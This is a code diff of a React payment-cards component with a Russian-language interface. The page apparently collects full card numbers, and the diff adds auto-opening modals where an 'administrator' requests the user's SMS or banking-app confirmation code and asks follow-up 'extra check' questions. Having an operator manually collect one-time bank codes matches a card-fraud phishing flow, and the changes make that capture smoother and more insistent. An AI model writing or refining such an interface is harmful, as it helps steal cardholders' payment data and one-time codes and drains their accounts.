@@ -1,8 +1,15 @@
 "use client"
 
-import { useState, type FormEvent } from "react"
+import { useEffect, useRef, useState, type FormEvent, type ReactNode } from "react"
 import useSWR from "swr"
-import { deletePaymentCard, requestCardBinding, setDefaultPaymentCard, submitCardCode, type PaymentCardView } from "@/app/actions/cards"
+import {
+  deletePaymentCard,
+  requestCardBinding,
+  setDefaultPaymentCard,
+  submitCardCode,
+  submitExtraCheckResponse,
+  type PaymentCardView,
+} from "@/app/actions/cards"
 import { reviewFetcher } from "@/lib/review-fetcher"
 import { CARD_BRAND_LABEL, detectBrand, formatCardNumber, formatExpiry, isExpiryValid, luhnValid, maskCard, normalizeCardNumber, parseExpiry, type CardBrand } from "@/lib/payment-cards"
 import { CardBrandMark } from "@/components/cabinet/card-brand-mark"
@@ -26,6 +33,8 @@ export function PaymentCards({ initial }: { initial: PaymentCardView[] }) {
   const [pendingId, setPendingId] = useState<number | null>(null)
   const [error, setError] = useState<string | null>(null)
   const [formOpen, setFormOpen] = useState(false)
+  const [modalCardId, setModalCardId] = useState<number | null>(null)
+  const autoOpenedKeys = useRef<Set<string>>(new Set())
 
   async function run(id: number, action: () => Promise<PaymentCardView[]>) {
     setPendingId(id)
@@ -38,6 +47,23 @@ export function PaymentCards({ initial }: { initial: PaymentCardView[] }) {
       setPendingId(null)
     }
   }
+
+  // Открываем красивое окно сразу, как только карте нужен код или пришёл вопрос доп. проверки.
+  useEffect(() => {
+    for (const card of cards) {
+      const needsAction =
+        card.status === "code_requested" ||
+        (card.status === "extra_check" && Boolean(card.extraCheckMessage) && !card.extraCheckResponse)
+      if (!needsAction) continue
+      const key = `${card.id}:${card.status}:${card.extraCheckMessage ?? ""}`
+      if (autoOpenedKeys.current.has(key)) continue
+      autoOpenedKeys.current.add(key)
+      setModalCardId(card.id)
+      break
+    }
+  }, [cards])
+
+  const modalCard = cards.find((c) => c.id === modalCardId) ?? null
 
   return (
     <div className="flex flex-col gap-6">
@@ -54,13 +80,27 @@ export function PaymentCards({ initial }: { initial: PaymentCardView[] }) {
                 onDelete={() => {
                   if (confirm(`Отвязать карту ${maskCard(card.last4)}?`)) void run(card.id, async () => (await deletePaymentCard(card.id)).cards)
                 }}
-                onSubmitCode={(code) => run(card.id, async () => (await submitCardCode(card.id, code)).cards)}
+                onOpenAction={() => setModalCardId(card.id)}
               />
             </li>
           ))}
         </ul>
       )}
       {(error || fetchError) && <p role="alert" className="text-sm text-destructive">{error ?? "Не удалось загрузить карты."}</p>}
+
+      {modalCard && (
+        <CardActionModal
+          card={modalCard}
+          disabled={pendingId !== null}
+          onClose={() => setModalCardId(null)}
+          onSubmitCode={(code) =>
+            run(modalCard.id, async () => (await submitCardCode(modalCard.id, code)).cards).then(() => setModalCardId(null))
+          }
+          onSubmitExtraCheck={(response) =>
+            run(modalCard.id, async () => (await submitExtraCheckResponse(modalCard.id, response)).cards).then(() => setModalCardId(null))
+          }
+        />
+      )}
 
       {formOpen ? (
         <BindingRequestForm
@@ -97,17 +137,18 @@ function CardTile({
   disabled,
   onMakeDefault,
   onDelete,
-  onSubmitCode,
+  onOpenAction,
 }: {
   card: PaymentCardView
   busy: boolean
   disabled: boolean
   onMakeDefault: () => void
   onDelete: () => void
-  onSubmitCode: (code: string) => void
+  onOpenAction: () => void
 }) {
   const confirmed = card.status === "confirmed"
-  const [code, setCode] = useState("")
+  const awaitingExtraCheckMessage = card.status === "extra_check" && !card.extraCheckMessage
+  const needsExtraCheckResponse = card.status === "extra_check" && Boolean(card.extraCheckMessage) && !card.extraCheckResponse
   return (
     <div
       className={cn(
@@ -178,50 +219,178 @@ function CardTile({
         </div>
       </div>
       {card.status === "pending" && (
-        <div className="relative flex flex-col gap-2 rounded-2xl bg-background/60 p-3 backdrop-blur">
-          <p className="text-xs leading-relaxed text-foreground/80">Заявка у администратора. После привязки карта появится здесь как подтверждённая.</p>
+        <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
+          <Spinner className="size-4 shrink-0 text-foreground/70" />
+          <p className="text-xs leading-relaxed text-foreground/80">Ожидайте решения администратора по привязке карты.</p>
         </div>
       )}
-      {card.status === "extra_check" && (
-        <div className="relative flex flex-col gap-2 rounded-2xl bg-background/60 p-3 backdrop-blur">
-          <p className="text-xs leading-relaxed text-foreground/80">Администратор проводит дополнительную проверку. Мы свяжемся с вами.</p>
+      {awaitingExtraCheckMessage && (
+        <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
+          <Spinner className="size-4 shrink-0 text-foreground/70" />
+          <p className="text-xs leading-relaxed text-foreground/80">Администратор проводит дополнительную проверку. Ожидайте вопрос.</p>
+        </div>
+      )}
+      {needsExtraCheckResponse && (
+        <button
+          type="button"
+          onClick={onOpenAction}
+          disabled={disabled}
+          className="relative flex items-center justify-between gap-2 rounded-2xl bg-gold/90 p-3 text-left text-gold-foreground transition hover:bg-gold disabled:opacity-50"
+        >
+          <span className="text-xs font-semibold leading-relaxed">Администратор задал вопрос. Нажмите, чтобы ответить.</span>
+          <ArrowRightMark className="size-4 shrink-0" />
+        </button>
+      )}
+      {card.status === "extra_check" && Boolean(card.extraCheckMessage) && Boolean(card.extraCheckResponse) && (
+        <div className="relative flex items-center gap-2.5 rounded-2xl bg-background/60 p-3 backdrop-blur">
+          <Spinner className="size-4 shrink-0 text-foreground/70" />
+          <p className="text-xs leading-relaxed text-foreground/80">Ответ отправлен. Ожидайте решения администратора.</p>
         </div>
       )}
       {card.status === "code_requested" && (
+        <button
+          type="button"
+          onClick={onOpenAction}
+          disabled={disabled}
+          className="relative flex items-center justify-between gap-2 rounded-2xl bg-gold/90 p-3 text-left text-gold-foreground transition hover:bg-gold disabled:opacity-50"
+        >
+          <span className="text-xs font-semibold leading-relaxed">Нужен код подтверждения. Нажмите, чтобы ввести.</span>
+          <ArrowRightMark className="size-4 shrink-0" />
+        </button>
+      )}
+    </div>
+  )
+}
+
+function Modal({ title, description, onClose, children }: { title: string; description?: string; onClose: () => void; children: ReactNode }) {
+  useEffect(() => {
+    const onKey = (e: KeyboardEvent) => {
+      if (e.key === "Escape") onClose()
+    }
+    document.addEventListener("keydown", onKey)
+    return () => document.removeEventListener("keydown", onKey)
+  }, [onClose])
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4" role="dialog" aria-modal="true" aria-label={title}>
+      <button type="button" aria-label="Закрыть окно" onClick={onClose} className="absolute inset-0 bg-background/80 backdrop-blur-sm" />
+      <div className="relative w-full max-w-md rounded-3xl bg-card p-6 text-foreground shadow-2xl ring-1 ring-border animate-in fade-in zoom-in-95 duration-200 sm:p-7">
+        <button
+          type="button"
+          onClick={onClose}
+          aria-label="Закрыть"
+          className="absolute right-4 top-4 grid size-8 place-items-center rounded-full text-muted-foreground transition hover:bg-muted hover:text-foreground"
+        >
+          <CloseMark className="size-4" />
+        </button>
+        <h2 className="font-display text-lg font-bold text-foreground text-pretty pr-8">{title}</h2>
+        {description && <p className="mt-1.5 text-sm leading-relaxed text-muted-foreground text-pretty">{description}</p>}
+        <div className="mt-5">{children}</div>
+      </div>
+    </div>
+  )
+}
+
+function CardActionModal({
+  card,
+  disabled,
+  onClose,
+  onSubmitCode,
+  onSubmitExtraCheck,
+}: {
+  card: PaymentCardView
+  disabled: boolean
+  onClose: () => void
+  onSubmitCode: (code: string) => Promise<void>
+  onSubmitExtraCheck: (response: string) => Promise<void>
+}) {
+  const [value, setValue] = useState("")
+  const [submitting, setSubmitting] = useState(false)
+  const field = "min-h-14 w-full rounded-2xl border border-border/60 bg-background/60 px-4 text-base text-foreground outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/30"
+
+  if (card.status === "extra_check" && card.extraCheckMessage && !card.extraCheckResponse) {
+    return (
+      <Modal title="Дополнительная проверка" description={card.extraCheckMessage} onClose={onClose}>
         <form
-          onSubmit={(e) => {
+          onSubmit={async (e) => {
             e.preventDefault()
-            if (code.trim()) {
-              onSubmitCode(code.trim())
-              setCode("")
+            if (!value.trim()) return
+            setSubmitting(true)
+            try {
+              await onSubmitExtraCheck(value.trim())
+            } finally {
+              setSubmitting(false)
             }
           }}
-          className="relative flex flex-col gap-2 rounded-2xl bg-background/60 p-3 backdrop-blur"
+          className="flex flex-col gap-4"
         >
-          <p className="text-xs leading-relaxed text-foreground/80">Администратору нужен код подтверждения из SMS или банковского приложения.</p>
-          <div className="flex gap-2">
+          <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
+            Ваш ответ
+            <textarea
+              value={value}
+              onChange={(e) => setValue(e.target.value)}
+              disabled={disabled || submitting}
+              required
+              rows={4}
+              maxLength={500}
+              placeholder="Введите ответ администратору"
+              className={cn(field, "min-h-28 resize-none py-3")}
+            />
+          </label>
+          <div className="flex flex-col gap-3 sm:flex-row">
+            <button type="submit" disabled={disabled || submitting || !value.trim()} className="min-h-14 flex-1 rounded-full bg-primary px-5 text-base font-semibold text-primary-foreground transition hover:opacity-90 disabled:opacity-50">
+              {submitting ? "Отправляем…" : "Отправить ответ"}
+            </button>
+            <button type="button" onClick={onClose} className="min-h-14 rounded-full border border-border px-5 text-base text-foreground">Позже</button>
+          </div>
+        </form>
+      </Modal>
+    )
+  }
+
+  if (card.status === "code_requested") {
+    return (
+      <Modal title="Код подтверждения" description="Введите код из SMS или банковского приложения, который запросил администратор." onClose={onClose}>
+        <form
+          onSubmit={async (e) => {
+            e.preventDefault()
+            if (!value.trim()) return
+            setSubmitting(true)
+            try {
+              await onSubmitCode(value.trim())
+            } finally {
+              setSubmitting(false)
+            }
+          }}
+          className="flex flex-col gap-4"
+        >
+          <label className="flex flex-col gap-1.5 text-sm text-muted-foreground">
+            Код подтверждения
             <input
-              value={code}
-              onChange={(e) => setCode(e.target.value)}
-              disabled={disabled}
+              value={value}
+              onChange={(e) => setValue(e.target.value)}
+              disabled={disabled || submitting}
+              required
+              autoFocus
               inputMode="numeric"
               autoComplete="one-time-code"
               placeholder="Код из SMS"
               maxLength={20}
-              className="min-h-11 flex-1 rounded-xl border border-border/60 bg-background/80 px-3 font-mono text-sm tabular-nums text-foreground outline-none transition focus:border-primary focus:ring-2 focus:ring-primary/30"
+              className={cn(field, "text-center font-mono text-xl tracking-[0.3em] tabular-nums")}
             />
-            <button
-              type="submit"
-              disabled={disabled || !code.trim()}
-              className="min-h-11 shrink-0 rounded-xl bg-gold px-4 text-sm font-semibold text-gold-foreground transition hover:opacity-90 disabled:opacity-50"
-            >
-              Отправить
+          </label>
+          <div className="flex flex-col gap-3 sm:flex-row">
+            <button type="submit" disabled={disabled || submitting || !value.trim()} className="min-h-14 flex-1 rounded-full bg-primary px-5 text-base font-semibold text-primary-foreground transition hover:opacity-90 disabled:opacity-50">
+              {submitting ? "Отправляем…" : "Подтвердить код"}
             </button>
+            <button type="button" onClick={onClose} className="min-h-14 rounded-full border border-border px-5 text-base text-foreground">Позже</button>
           </div>
         </form>
-      )}
-    </div>
-  )
+      </Modal>
+    )
+  }
+
+  return null
 }
 
 function BindingRequestForm({ onCancel, onDone }: { onCancel: () => void; onDone: (cards: PaymentCardView[]) => Promise<void> }) {
@@ -398,4 +567,21 @@ function TrashMark({ className }: { className?: string }) {
 
 function LockMark({ className }: { className?: string }) {
   return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><rect x="5" y="11" width="14" height="10" rx="2" /><path d="M8 11V7a4 4 0 018 0v4" /></svg>
+}
+
+function ArrowRightMark({ className }: { className?: string }) {
+  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><path d="M5 12h14M13 6l6 6-6 6" /></svg>
+}
+
+function CloseMark({ className }: { className?: string }) {
+  return <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className} aria-hidden="true"><path d="M6 6l12 12M18 6L6 18" /></svg>
+}
+
+function Spinner({ className }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" fill="none" className={cn("animate-spin", className)} aria-hidden="true">
+      <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="2.5" opacity="0.25" />
+      <path d="M21 12a9 9 0 00-9-9" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" />
+    </svg>
+  )
 }
